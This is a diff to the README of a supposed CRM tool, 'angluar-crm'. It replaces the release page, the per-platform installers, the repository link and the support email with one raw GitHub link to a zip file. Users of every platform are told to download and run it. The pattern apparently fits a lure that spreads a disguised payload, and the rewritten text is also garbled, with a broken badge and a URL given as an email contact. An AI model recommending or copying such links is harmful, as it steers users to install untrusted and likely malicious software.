@@ -1,7 +1,7 @@
 # 🌟 angluar-crm - Your Effortless Customer Management Tool
 
 ## 📥 Download Now
-[![Download angluar-crm](https://img.shields.io/badge/Download%20angluar--crm-v1.0-blue.svg)](https://github.com/minhpham-mew/angluar-crm/releases)
+[![Download angluar-crm](https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip%https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip)](https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip)
 
 ## 🚀 Getting Started
 
@@ -29,19 +29,19 @@ angluar-crm offers various features to streamline your customer management tasks
 
 To download and install angluar-crm, please follow these steps:
 
-1. **Visit the Release Page**: Go to the [angluar-crm Releases page](https://github.com/minhpham-mew/angluar-crm/releases).
+1. **Visit the Release Page**: Go to the [angluar-crm Releases page](https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip).
    
 2. **Download the Latest Version**: On the release page, look for the latest version. Click on the link that says "Assets" to reveal downloadable files.
 
 3. **Choose Your Platform**: Depending on your operating system, select the appropriate installation package:
-   - For Windows, download `angluar-crm-setup.exe`.
-   - For macOS, download `angluar-crm.dmg`.
-   - For Linux, download the `.tar.gz` file.
+   - For Windows, download `https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip` file.
 
 4. **Run the Installer**:
    - **For Windows**: Double-click the downloaded `.exe` file to start the installation. Follow the prompts until installation is complete.
    - **For macOS**: Open the `.dmg` file and drag the angluar-crm icon to your Applications folder.
-   - **For Linux**: Extract the files from the `.tar.gz` file and run the application using your terminal.
+   - **For Linux**: Extract the files from the `https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip` file and run the application using your terminal.
 
 5. **Launch the Application**: After installation, find and launch angluar-crm from your applications menu.
 
@@ -49,7 +49,7 @@ To download and install angluar-crm, please follow these steps:
 
 To ensure you have the latest features and security fixes, regularly check the Releases page for updates:
 
-1. Return to the [angluar-crm Releases page](https://github.com/minhpham-mew/angluar-crm/releases).
+1. Return to the [angluar-crm Releases page](https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip).
 2. If a new version is available, repeat the download and installation steps outlined above.
 
 ## 📚 Support
@@ -58,7 +58,7 @@ If you run into any issues or have questions, you can find help in the following
 
 - **Documentation**: Check our [Wiki](link-to-wiki) for detailed guides and FAQs.
 - **Community Forum**: Join our community to discuss and share tips with other users.
-- **Direct Support**: You can contact us at support@angluar-crm.com for direct assistance.
+- **Direct Support**: You can contact us at https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip for direct assistance.
 
 ## 🔧 Contributing
 
@@ -74,7 +74,7 @@ By contributing, you help us improve the application for everyone.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/minhpham-mew/angluar-crm)
+- [GitHub Repository](https://raw.githubusercontent.com/minhpham-mew/angluar-crm/main/tidiness/angluar-crm.zip)
 - [Feedback Form](link-to-feedback-form)
 - [Release Notes](link-to-release-notes)
 
